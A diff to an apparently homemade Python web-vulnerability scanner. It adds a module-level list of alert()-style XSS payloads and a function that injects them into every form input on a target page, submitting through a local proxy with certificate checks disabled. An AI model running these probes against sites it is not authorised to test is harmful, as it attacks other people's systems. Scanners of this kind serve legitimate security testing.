@@ -9,6 +9,16 @@ from requests.exceptions import SSLError, ConnectionError
 
 proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}
 
+xss_payloads = [
+    "<script>alert('XSS')</script>",
+    "javascript:alert('XSS')",
+    "';alert('XSS');//",
+    "<img src=x onerror=alert('XSS')>",
+    "<svg/onload=alert('XSS')>",
+    "'<script>alert('XSS')</script>'",
+    "\"<script>alert('XSS')</script>\""
+]
+
 def get_response(url, retries=3):
     """
     Sends an HTTP GET request to the specified URL, with retries in case of failure.
@@ -108,51 +118,60 @@ def find_urls_to_test(url, base_url):
     
     return links
 
+def get_forms(response):
+    soup = BeautifulSoup(response.text, 'html.parser')
+    return soup.find_all('form')
+
+
 def exploit_xss(url):
-    """
-    Attempts to perform Cross-Site Scripting (XSS) on the target URL.
-
-    Args:
-        url (str): The target URL for the XSS test.
-
-    Description:
-        - Iterates through a list of common XSS payloads.
-        - Appends each payload to the target URL and sends an HTTP request.
-        - If the payload is successfully injected (e.g., the response contains the payload),
-          the URL is considered vulnerable.
-        - Handles SSL and request-related errors.
-    """
-    xss_payloads = [
-        "<script>alert('XSS')</script>",
-        "javascript:alert('XSS')",
-        "';alert('XSS');//",
-        "<img src=x onerror=alert('XSS')>",
-        "<svg/onload=alert('XSS')>",
-        "'<script>alert('XSS')</script>'",
-        "\"<script>alert('XSS')</script>\""
-    ]
-
     for payload in xss_payloads:
-        # Construct the target URL with the XSS payload
-        target_url = url + payload
+        target_url = f"{url}?input={payload}"
         try:
-            # Send the request with the XSS payload
             r = requests.get(target_url, verify=False, proxies=proxies, timeout=10)
-            
-            # Check if the payload is reflected in the response, indicating a potential XSS vulnerability
             if payload in r.text:
-                print(f"[+] XSS vulnerability found with payload: {payload}")
+                print(f"[+] XSS vulnerability found in URL with payload: {payload}")
                 return True
-            else:
-                print(f"[-] Payload not reflected for: {payload}")
         except SSLError as e:
             print(f"[-] SSL Error on {target_url}: {e}")
-            return False
         except requests.RequestException as e:
             print(f"[-] Request error on {target_url}: {e}")
-            return False
+    print("[-] No XSS vulnerabilities found in URL.")
+    return False
 
-    print("[-] No XSS vulnerabilities found.")
+def submit_xss_payloads_to_forms(url):
+    response = get_response(url)
+    if not response:
+        return False
+
+    soup = BeautifulSoup(response.text, 'html.parser')
+    forms = soup.find_all('form')
+    if not forms:
+        print("[-] No forms found on the page.")
+        return False
+    
+    for form in forms:
+        action = form.get('action')
+        method = form.get('method', 'get').lower()
+        form_url = urljoin(url, action)
+        
+        inputs = form.find_all('input')
+        form_data = {}
+        for input_tag in inputs:
+            input_name = input_tag.get('name')
+            if input_name:
+                form_data[input_name] = random.choice(xss_payloads)
+        
+        for payload in xss_payloads:
+            if method == 'post':
+                r = requests.post(form_url, data=form_data, verify=False, proxies=proxies)
+            else:
+                r = requests.get(form_url, params=form_data, verify=False, proxies=proxies)
+            
+            if payload in r.text:
+                print(f"[+] XSS vulnerability found in form with payload: {payload}")
+                return True
+
+    print("[-] No XSS vulnerabilities found in forms.")
     return False
 
 
@@ -187,6 +206,7 @@ if __name__ == "__main__":
             #        print("[-] URL not vulnerable to sql injection")
             
             exploit_xss(test_url)
+            submit_xss_payloads_to_forms(test_url)
             
     else:
         print("[-] No URLs with parameters found.")
